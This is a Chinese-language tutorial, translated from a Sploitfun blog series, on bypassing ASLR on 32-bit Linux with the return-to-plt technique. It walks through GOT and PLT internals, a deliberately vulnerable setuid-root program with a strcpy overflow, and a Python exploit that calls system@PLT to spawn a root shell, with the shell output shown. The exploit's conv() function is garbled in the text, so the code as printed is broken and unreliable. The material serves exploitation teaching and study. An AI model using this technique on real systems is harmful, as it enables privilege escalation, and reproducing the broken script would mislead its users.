CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。   
转载本文请务必注明，文章出处：《[Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)](http://www.csyssec.org/20170101/bypassaslr-returntoplt)》与作者信息：CSysSec出品  

VM Setup: Ubuntu 12.04(x86)  

在前面的文章中，为了利用漏洞代码，攻击者需要知道：  

栈地址（为了跳转到shellcode中)  
libc基地址(为了成功绕过NX)  
因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”  

## ASLR

地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化  

* 栈地址
* 堆地址
* 共享库地址
上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。  

从前文中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：  

libc函数地址=libc基地址+函数偏移  
这里  

由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000) 
函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)  
现在当我们利用以下命令打开全随机化选项时(full randomization)  

`#echo 2 > /proc/sys/kernel/randomize_va_space`
libc基地址将会被随机化  

注意： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.  

* Return-to-plt（这篇文章）
* 暴力破解(第二篇章)
* GOT覆盖与GOR解引用(第三篇章)

## Return-to-plt

利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。  

什么是PLT,如何调用‘function@PLT'来调用其中的'function' 

## 调用‘function@PLT’

要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！  

不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!  

## 什么是PIC呢？
位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。  
  
动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：  

* 全局偏移表(Global Offset Table(GOT)): 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.
* 过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址
很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。

代码样例：  

``` c
//eg.c
//$gcc -g -o eg eg.c
#include <stdio.h>
int main(int argc, char* argv[]) {
 printf("Hello %s\n", argv[1]);
 return 0;
}
```
下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。  

```
(gdb) disassemble main
Dump of assembler code for function main:
 0x080483e4 <+0>: push %ebp
 0x080483e5 <+1>: mov %esp,%ebp
 0x080483e7 <+3>: and $0xfffffff0,%esp
 0x080483ea <+6>: sub $0x10,%esp
 0x080483ed <+9>: mov 0xc(%ebp),%eax
 0x080483f0 <+12>: add $0x4,%eax
 0x080483f3 <+15>: mov (%eax),%edx
 0x080483f5 <+17>: mov $0x80484e0,%eax
 0x080483fa <+22>: mov %edx,0x4(%esp)
 0x080483fe <+26>: mov %eax,(%esp)
 0x08048401 <+29>: call 0x8048300 <printf@plt>
 0x08048406 <+34>: mov $0x0,%eax
 0x0804840b <+39>: leave 
 0x0804840c <+40>: ret 
End of assembler dump.
(gdb) disassemble 0x8048300
Dump of assembler code for function printf@plt:
 0x08048300 <+0>: jmp *0x804a000
 0x08048306 <+6>: push $0x0
 0x0804830b <+11>: jmp 0x80482f0
End of assembler dump.
(gdb)
```
在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。  

```
(gdb) x/1xw 0x804a000
0x804a000 <printf@got.plt>: 0x08048306
(gdb)
```
现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):  

```
(gdb) x/1xw 0x804a000
0x804a000 <printf@got.plt>: 0xb7e6e850
(gdb)
```
注意 1: 如果你想了解PLT和GOT的更多信息，可以阅读[这篇文章](http://sploitfun.blogspot.in/2013/06/dynamic-linking-internals.html)  

注意 2: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！  

```
0x08048306 <+6>: push $0x0
0x0804830b <+11>: jmp 0x80482f0
```
了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。  

漏洞代码:  

``` c
#include <stdio.h>
#include <string.h>
/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */
void shell() {
 system("/bin/sh");
 exit(0);
}
int main(int argc, char* argv[]) {
 int i=0;
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 return 0;
}
```
编译命令:  

``` bash
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -g -fno-stack-protector -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
``` 
现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址  

```
(gdb) disassemble shell
Dump of assembler code for function shell:
 0x08048474 <+0>: push %ebp
 0x08048475 <+1>: mov %esp,%ebp
 0x08048477 <+3>: sub $0x18,%esp
 0x0804847a <+6>: movl $0x80485a0,(%esp)
 0x08048481 <+13>: call 0x8048380 <system@plt>
 0x08048486 <+18>: movl $0x0,(%esp)
 0x0804848d <+25>: call 0x80483a0 <exit@plt>
End of assembler dump.
(gdb)
```
利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！  
 
漏洞利用代码：  

``` python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call
system = 0x8048380
exit = 0x80483a0
system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'
#endianess convertion
def conv(num):
 return struct.pack("<I",numystem + exit + system_arg
buf = "A" * 272
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)
print "Calling vulnerable program"
call(["./vuln", buf])
```
执行上述程序就可以获取root shell，如下所示：  

``` python
$ python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������
# id
uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)
# exit
$
```
注意： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在第三篇中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。  